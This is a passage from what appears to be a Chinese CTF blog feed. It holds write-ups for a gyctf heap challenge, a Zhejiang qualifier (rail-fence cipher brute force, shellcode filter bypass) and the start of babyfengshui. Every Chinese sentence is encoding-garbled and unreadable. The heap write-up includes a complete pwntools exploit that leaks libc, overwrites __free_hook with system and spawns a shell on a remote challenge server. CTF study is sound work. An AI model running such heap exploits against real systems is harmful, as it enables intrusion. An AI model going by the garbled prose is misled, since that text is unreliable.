class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°libcåœ°å€</p><p><img src="/2021/10/26/gyctf_2020_document/1.png" alt="1"></p><h2 id="ç¡®å®šæ”»å‡»æ€è·¯"><a href="#ç¡®å®šæ”»å‡»æ€è·¯" class="headerlink" title="ç¡®å®šæ”»å‡»æ€è·¯"></a>ç¡®å®šæ”»å‡»æ€è·¯</h2><p>æ„é€ å †é‡å ä»¥æ­¤èƒ½ä¿®æ”¹0x20å †å—ä¸Šé¢çš„æŒ‡é’ˆåˆ°<code>free_hook</code>å»è¦†ç›–<code>free_hook</code>ä¸ºsystemå‡½æ•°ï¼Œå†freeä¸€ä¸ªå¸¦æœ‰/bin/shçš„å †å—å°±å¯ä»¥getshellï¼Œæ­¤æ—¶binä¸­å·²ç»æœ‰ä¸€ä¸ª0x90çš„<code>unsorted bin</code>ï¼Œå†æ¬¡addä¸€ä¸ªå› ä¸ºå…ˆåˆ†é…äº†è¿™ä¸ª0x20çš„å †å—ï¼Œ<code>unsorted bin</code>å°±ä¼šè¿›è¡Œåˆ‡å‰²ï¼Œä½†æ˜¯edit 0å‘ç°å®ƒåœ¨0x10åç§»ä¸Šeditçš„ï¼Œå› æ­¤ä¸è¡Œã€‚ä¸è¡Œå’±å°±å†æ¢ä¸€ä¸ªå˜›ï¼Œå†addä¸€æ¬¡ï¼Œæ­¤æ—¶çš„<code>unsorted bin</code>ä¼šè¿›å…¥smallbinï¼Œä½†æ˜¯ä¸å½±å“ï¼Œè¿˜æ˜¯ä»ä¸Šé¢åˆ‡å‰²ä¸‹æ¥ä½œä¸ºç¬¬å››ç»„çš„å°å—ã€‚ç„¶åeditç¬¬0ä¸ªå—æŠŠè¿™ä¸ªå—çš„æŒ‡é’ˆæ”¹æˆ<code>free_hook</code>ã€‚æ­¤æ—¶ç¬¬å››ä¸ªå †å—çš„æŒ‡é’ˆè¢«æ”¹æˆäº†<code>free_hook</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å†edit 3ä¸ºsystemå³å¯ã€‚å®é™…æµ‹è¯•éœ€è¦è€ƒè™‘å®ƒåœ¨è¯»æ•°æ®ä¹‹åä¼šå†™åœ¨é‚£ä¸ªæŒ‡é’ˆåç§»0x10çš„åœ°æ–¹å†™æ•°æ®ï¼Œæ‰€ä»¥å‰é¢æˆ‘ä»¬editçš„æ—¶å€™ä¹ŸæŠŠå®ƒæ”¹æˆ<code>free_hook</code>-0x10ã€‚æœ€åedit 3 ä¸ºsystemå‡½æ•°ã€‚ç”±äºè¿™ä¸ªè¾“å…¥æ˜¯for() read(0,buf,1)è¯»å–çš„ï¼Œå› æ­¤0x70ä¸ªå­—èŠ‚å¿…é¡»å†™æ»¡ï¼Œé‚£è¾¹ç”±äºéƒ½æ˜¯hookï¼Œæˆ‘ä»¬éƒ½æ¸…ç©ºè¾ƒä¸ºä¿é™©ï¼Œå› ä¸ºä¸‡ä¸€ä¸å°å¿ƒè°ƒç”¨åˆ°äº†é‚£è¾¹çš„hookå¾ˆå®¹æ˜“crashï¼Œé‚£ä¹ˆexpæ ¹æ®ä»¥ä¸Šæ€è·¯å¾ˆå®¹æ˜“å¾—åˆ°äº†ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;node4.buuoj.cn&#x27;,26476)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">def add(name,sex,payload):#8,1,0x70</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;name&#x27;,name)</span><br><span class="line">    p.sendafter(b&#x27;sex&#x27;,sex,timeout=0.01)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line">def edit(index,sex,payload):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line">    if sex:p.sendlineafter(b&#x27;?&#x27;,b&#x27;Y&#x27;)</span><br><span class="line">    else:p.sendlineafter(b&#x27;?&#x27;,&#x27;N&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(0,&#x27;./gyctf_2020_document&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;a&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;b&#x27;*0x70)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\0&#x27;))-88-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&#x27;libc:&#x27;+hex(libc_addr))</span><br><span class="line">success(&#x27;free_hook&#x27;+hex(libc_addr+libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;c&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;d&#x27;*0x70)</span><br><span class="line">edit(0,0,b&#x27;d&#x27;*0x10+p64(libc_addr+libc.sym[&#x27;__free_hook&#x27;]-0x10)+b&#x27;d&#x27;*0x58)</span><br><span class="line">edit(3,0,p64(libc_addr+libc.sym[&#x27;system&#x27;])+b&#x27;e&#x27;*0x68)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2021/10/26/gyctf_2020_document/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021æµ™æ±Ÿçœé¢„èµ›</title>
      <link href="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/"/>
      <url>/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>ä½œè€…å› ä¸ºä¹‹å‰ç”µè„‘ä¸¢äº†å¯¼è‡´ä¸­é—´ä¸¤ä¸ªæœˆæ–­æ›´ï¼Œæœ€è¿‘ä¼šæŠŠä¹‹å‰çš„å¾ˆå¤šéƒ½è¡¥å›æ¥ã€‚è¨€å½’æ­£ä¼ ï¼Œè¿™æ¬¡æ¯”èµ›æ€»ä½“æ¥è¯´ä¸å¤ªç†æƒ³ï¼Œæ²¡æœ‰è¾¾åˆ°é¢„æœŸã€‚</p><span id="more"></span><h2 id="æ¯”èµ›æƒ…å†µæ€»ç»“"><a href="#æ¯”èµ›æƒ…å†µæ€»ç»“" class="headerlink" title="æ¯”èµ›æƒ…å†µæ€»ç»“"></a>æ¯”èµ›æƒ…å†µæ€»ç»“</h2><p>æˆ‘ï¼Œå­¦å§ï¼Œå­¦é•¿åˆ†åˆ«å‡ºä¸€é¢˜ï¼Œæœ€ç»ˆå¾—åˆ†350ï¼Œæ’ååœ¨42ã€‚è€Œæˆ‘æ˜¯å‡ºäº†ä¸€é“å¯†ç é¢˜ï¼Œpwné¢˜æ²¡å‡ºï¼Œå› ä¸ºpwné¢˜ä¸€é“shellcodeé¢˜å½“æ—¶åˆ†ææ²¡æœ‰è€ƒè™‘\0æˆªæ–­çš„è¿™ä¸ªç‰¹æ€§ï¼Œä»¥ä¸ºæ‰€æœ‰shellcodeéƒ½è¦æ»¡è¶³è¿™ä¸ªç‰¹æ€§ï¼Œè§‰å¾—æ‰‹æ’•æ±‡ç¼–æ’•ä¸è¿‡ï¼Œå°±æ”¾å¼ƒäº†ï¼Œæ²¡æƒ³åˆ°ç«Ÿæ˜¯ä¸€ä¸ª\0ç»•è¿‡ï¼Œè¿™æ³¢ï¼Œå±å®å¤§æ„äº†é—ªäº†ã€‚</p><h2 id="éƒ¨åˆ†é¢˜ç›®writeup"><a href="#éƒ¨åˆ†é¢˜ç›®writeup" class="headerlink" title="éƒ¨åˆ†é¢˜ç›®writeup"></a>éƒ¨åˆ†é¢˜ç›®writeup</h2><h3 id="Crypto-Easy-Railfence"><a href="#Crypto-Easy-Railfence" class="headerlink" title="Crypto-Easy Railfence"></a>Crypto-Easy Railfence</h3><p>è§‚å¯ŸåŠ å¯†æ–¹å¼ï¼Œå‘ç°è¿™ä¸ªåŠ å¯†åªè¿›è¡Œäº†ä½ç½®å¯¹æ¢ï¼Œå¹¶ä¸”å¼€å¤´ç‰¹æ„æé†’flagçš„å½¢å¼ä¸º flag{} ï¼Œé‚£ä¹ˆå…ˆæ ¹æ® å·²æœ‰é•¿åº¦å†™å‡ºå‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨Railå’Œoffsetä¸ç¡®å®šï¼Œä½†æ˜¯ flagçš„æ ¼å¼ç¡®å®šï¼Œå› æ­¤å¯¹å‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œç„¶åè§‚å¯Ÿå‘ç°lå’Œgè¿˜æœ‰{}åœ¨æ•´ä¸ª ç»™çš„åŠ å¯†ç»“æœä¸­åªæœ‰ä¸€ä¸ªå¹¶ä¸”ä½ç½®å·²ç»ç¡®å®šï¼Œé‚£ä¹ˆæ ¹æ®è¿™ä¸ªç‰¹æ€§å†™å‡ºå¦‚ä¸‹è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encryptå‡½æ•°å°†ç»“å°¾çš„print (d)æ”¹æˆäº†return d</span></span><br><span class="line"><span class="keyword">for</span> Rail <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> Offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> encrypt(m, Rail , Offset)[<span class="number">23</span>:<span class="number">25</span>]==<span class="string">&#x27;&#125;l&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(Rail,Offset)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ªç»“æœ 13 5å’Œ13 29ï¼Œå¡«å……ä½ä½æ•°å¤šäº†åº”è¯¥æœ‰ä¸€å®šçš„è§„å¾‹ï¼Œå› æ­¤offsetå–5å³å¯ã€‚</p><p> ç”±äºè¿™ä¸ªåŠ å¯†æ–¹å¼åªäº¤æ¢ä½ç½®ï¼Œå› æ­¤æˆ‘åœ¨æŸä¸€ä½å¤šçš„ä¸€ä¸ªå­—ç¬¦å¿…ç„¶ä¼šåœ¨å¦ä¸€ä¸ªä½ç½®ä¸€æ¨¡ä¸€æ ·çš„å‡ºç°ï¼Œå°† å·²åŒ¹é…çš„å­—ç¬¦æ•°ä½œä¸ºè¯¥ä¸ºæœ‰æ²¡æœ‰åŒ¹é…çš„æ¡ä»¶é€ä½çˆ†ç ´å³å¯ï¼Œä»¥ä¸‹ä¸ºå®Œæ•´è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target=<span class="string">&#x27;reetdrvhns0eutbftafmeon&#125;linnd=a1cOh!gcedos&#123;neuwkYav0irOceytounw&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">c,rails,offset</span>):</span></span><br><span class="line">    c = <span class="string">&#x27;$&#x27;</span> * offset + c</span><br><span class="line">    length = <span class="built_in">len</span>(c)</span><br><span class="line">    result = &#123;x: <span class="string">&quot;&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rails)&#125;</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        width = rails * <span class="number">2</span> - <span class="number">2</span></span><br><span class="line">        num = a % width</span><br><span class="line">        <span class="keyword">if</span> (num &lt; rails):</span><br><span class="line">            result.update(&#123;num: result[num] + c[a]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ll = <span class="number">2</span> * rails - <span class="number">2</span> - num</span><br><span class="line">            result.update(&#123;ll: result[ll] + c[a]&#125;)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(rails):</span><br><span class="line">        d = d + result[k]</span><br><span class="line">    d = d.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compare</span>(<span class="params">str1,str2</span>):</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span>(str1[i]==str2[i]):ans+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">Rail=<span class="number">13</span></span><br><span class="line">Offset=<span class="number">5</span></span><br><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for Rail in range(2,20):</span></span><br><span class="line"><span class="string">    for Offset in range(0,30):</span></span><br><span class="line"><span class="string">        if encrypt(m, Rail , Offset)[23:25]==&#x27;&#125;l&#x27;:</span></span><br><span class="line"><span class="string">            print(Rail,Offset)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">63</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        m=m[:i]+<span class="built_in">chr</span>(j)+m[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> compare(target,encrypt(m, Rail , Offset))==i+<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/1.png" alt="1"></p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;</span><br></pre></td></tr></table></figure><p>å†æ”¾å·¥å…·md5å³å¯ã€‚</p><p>å¯èƒ½æ˜¯å›ºå®šçš„ç®—æ³•æ€ç»´å§ï¼Œå°±åªæƒ³åˆ°è¿™ä¸ªï¼Œå¿˜äº†æœ‰å·¥å…·è¿™ç§ä¸œè¥¿äº†ã€‚å‚æ•°è§£å‡ºæ¥æ”¾åœ¨CyberChefä¸­å¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­ã€‚</p><h3 id="pwn-sx"><a href="#pwn-sx" class="headerlink" title="pwn-sx"></a>pwn-sx</h3><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/2.png" alt="2"></p><p>åˆ†ææ–‡ä»¶æ˜¯ä¸€é“shellcode é¢˜ç›®ï¼Œç„¶åè¾“å…¥çš„shellcodeç»è¿‡ä¼ å‚åˆ°è¿™ä¸ªå‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œæˆ‘ä»¥ä¸ºéƒ½è¦æ»¡è¶³ï¼Œç„¶åå°ç®—äº†ä¸€ä¸‹å‘ç°é™åˆ¶å¾ˆå¤šï¼Œåˆ†ç»„é™åˆ¶ï¼Œå½“æ—¶æˆ‘æŒºç»æœ›çš„ï¼Œæƒ³ç€è¿™è°èƒ½åšå•Šã€‚å¯æ˜¯ç»“æŸä¹‹åæˆ‘æ‰æƒ³åˆ°å¯ä»¥\0å­—èŠ‚ç»•è¿‡åˆ¤æ–­åé¢ç›´æ¥è·Ÿä¸Šshellcode ï¼Œåªè¦ä¿è¯å‰é¢èƒ½æ­£ç¡®æ‰§è¡ŒæŒ‡ä»¤æ»¡è¶³é‚£äº›æ¡ä»¶å°±å¯ä»¥ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°CyberChefå·¥å…·ä¸­çš„disassembleï¼Œå¯ä»¥ç›´æ¥æ ¹æ®å­—èŠ‚ç è½¬å‡ºæ¥æ±‡ç¼–æŒ‡ä»¤ï¼Œåªè¦æ‰§è¡Œä¸äº§ç”Ÿå¼‚å¸¸ï¼Œä¸è®©å®ƒæŒ‡ä»¤åç§»é‚£å°±éƒ½å¯ä»¥æ”¾ä¸Šæ¥ã€‚</p><p>å°ç®—ä¸€æ³¢ï¼Œå‘ç°ä¸‹æ ‡%3=0çš„å­—èŠ‚åªèƒ½åœ¨[0xc0-0xff]èŒƒå›´å†…ï¼Œ%3=1å’Œ%3=2çš„åˆ™åœ¨0x80-0xbfçš„èŒƒå›´å†…ã€‚é‚£å°±ä¸€ä¸ªä¸ªæŒ‡ä»¤å°è¯•è¿‡å»ï¼Œæœ€åå‘ç°ä¸€ä¸ªå¾ˆåˆé€‚çš„ã€‚</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/3.png" alt="3"></p><p>æ‰§è¡Œå®Œä¹‹ååˆšå¥½èƒ½åœ¨æœ€åä¸€ä¸ª00å­—èŠ‚ä¹‹åï¼Œåé¢å¡«ä¸Šshellcodeç›´æ¥æ‰“å°±ç»“æŸäº†ï¼Œä¸‹é¢é™„ä¸Šæœ¬åœ°è¿è¡Œç»“æœã€‚</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/4.png" alt="4"></p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/5.png" alt="5"></p><p>ç»è¿‡æœ¬æ¬¡æ¯”èµ›ï¼Œä¹Ÿæ„è¯†åˆ°è‡ªå·±çš„ä¸è¶³åº”è¯¥æ˜¯è¿™äº›åŸºç¡€çŸ¥è¯†ï¼Œç®—æ³•ä¼˜åŠ¿åº”å½“å¥½å¥½åˆ©ç”¨èµ·æ¥å»ç ´å¯†ç è¯•è¯•çœ‹ã€‚æ€»ä¹‹ï¼Œåˆèµ›è¿‡å»ï¼Œå°±å¾—çœ‹å‘å†³èµ›äº†ï¼Œäº‰å–åœ¨å†³èµ›ä¸Šèƒ½ä¸€é¸£æƒŠäººï¼ŒåŠ æ²¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>babyfengshui_33c3_2016 writeup</title>
      <link href="/2021/08/15/babyfengshui_33c3_2016%20writeup/"/>
      <url>/2021/08/15/babyfengshui_33c3_2016%20writeup/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡æœ‰æ›´æ–°åšå®¢äº†ï¼Œå› ä¸ºä½œè€…å¤ªæ‡’äº†ï¼Œåˆæ‡’åˆèœï¼Œä»Šå¤©æ¥åº·åº·è¿™é“é¢˜ï¼Œbuuojçš„<a href="https://buuoj.cn/challenges#babyfengshui_33c3_2016">babyfengshui_33c3_2016</a></p><span id="more"></span><h2 id="åˆ†æelfæ–‡ä»¶"><a href="#åˆ†æelfæ–‡ä»¶" class="headerlink" title="åˆ†æelfæ–‡ä»¶"></a>åˆ†æelfæ–‡ä»¶</h2><p>checksecä¸€ä¸‹å‘ç°canaryä¿æŠ¤å’ŒNXä¿æŠ¤ï¼Œgotè¡¨æ²¡æœ‰ä¿æŠ¤ï¼Œä¸”éšå³åœ°å€æ²¡æœ‰å¼€å¯ã€‚è¿™å°±æ„å‘³ç€gotè¡¨å¯å†™ï¼Œæ‹–åˆ°IDAå½“ä¸­å‘ç°æ˜¯ä¸€ä¸ªç»å…¸çš„å †èœå•é¢˜ï¼Œä»¥æˆ‘ç°åœ¨çš„æ°´å¹³ï¼Œé‚£å°±æ˜¯å…ˆåˆ†æå®ƒfreeåæŒ‡é’ˆæœ‰æ— æ¸…é›¶ã€‚æœ¬æ¥ä¸€å¼€å§‹çœ‹å®ƒfreeäº†ä¸¤ä¸ªå †å—ï¼Œç¡®æŒ‡å°†ä¸€ä¸ªæŒ‡é’ˆæ¸…é›¶äº†ï¼Œä»¥ä¸ºæ˜¯æœ‰uafæ¼æ´ï¼Œä½†æ˜¯åé¢å‘ç°ä¸æ˜¯è¿™æ ·çš„ï¼Œå®ƒæ¯ä¸€æ¡ç›®åˆ†ä¸€ä¸ªnameå’Œå¯¹åº”çš„descriptionï¼Œnameä¸”dscriptionæ˜¯ç”¨æŒ‡é’ˆæŒ‡ç¤ºï¼Œå¹¶ä¸”æ¯ä¸ªæ¡ç›®å›ºå®šæ˜¯80å­—èŠ‚çš„å¤§å°ï¼Œå› æ­¤å¯ä»¥æŠŠä¸€ä¸ªæ¡ç›®çœ‹æˆä¸€ä¸ªç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘æŠŠæ•´ä¸ªç»“æ„ä½“freeäº†ä¹‹åå°±ç›¸å½“äºæŠŠè¿™ä¸ªdescriptionçš„æŒ‡é’ˆæ¸…é›¶äº†ï¼Œå› æ­¤æœ¬é¢˜ä¸å­˜åœ¨uafæ¼æ´ã€‚å†è§‚å¯Ÿæ·»åŠ ä¸€ä¸ªé¡¹ç›®çš„å‡½æ•°ï¼Œå‘ç°nameæ˜¯å›ºå®šé•¿åº¦è¾“å…¥ï¼Œä¸”ç”¨äº†fgetså‡½æ•°é™å®šè¾“å…¥0x7cå­—èŠ‚ï¼Œæ•´ä¸ªnameé‚£å°±æ˜¯ä¸å¯èƒ½æº¢å‡ºäº†ï¼Œå°±è¿off by nullæ¼æ´éƒ½ä¸å­˜åœ¨ã€‚é‚£ä¹ˆè¿™æ ·çš„è¯åªèƒ½çœ‹çœ‹editå‡½æ•°äº†ï¼Œeditå‡½æ•°å®ƒåœ¨ä¹‹å‰ifä¹Ÿä¼šæœ‰ä¸€ä¸ªé•¿åº¦è¾“å…¥ï¼Œå¹¶ä¸”ç”¨äº†ä¸‹é¢è¿™ä¸€å¥ifåˆ¤æ–­ï¼Œå¦‚æœä¸ºçœŸå°±ç›´æ¥é€€å‡ºç³»ç»Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="keyword">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>å®ƒè¿™ä¸ªæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œç¿»è¯‘æˆcè¯­è¨€å¤§æ¦‚å°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">heap *item</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(item-&gt;description+length&gt;=item<span class="number">-4</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå®ƒä»¬çš„åœ°å€ä¹‹å·®å°äºè¾“å…¥çš„é•¿åº¦ï¼Œé‚£å°±é€€å‡ºï¼Œå¦‚æœé•¿åº¦æº¢å‡ºåˆ°é‚£ä¸ªç»“æ„ä½“å †å—çš„metadataï¼Œé‚£å°±é€€å‡ºã€‚</p><p>çœ‹ä¼¼è¿™ä¸ªä¹Ÿä¸èƒ½æº¢å‡ºï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªèƒ½ç”¨ä¸€ä¸ªæ–¹æ³•ç»•è¿‡ã€‚å› ä¸ºå¦‚æœæˆ‘ä»¬ç›´æ¥åˆ†é…å †å—çš„è¯ï¼Œå®ƒä»¬ç‰©ç†åœ°å€æ˜¯ç›¸é‚»çš„ï¼Œä½†æ˜¯å¦‚æœå®ƒä»¬ä¸ç‰©ç†ç›¸é‚»ï¼Œä¸­é—´éš”äº†ä¸€ä¸ªå †å—ï¼Œé‚£å°±å¯ä»¥ä»»æ„æº¢å‡ºä¸­é—´çš„å 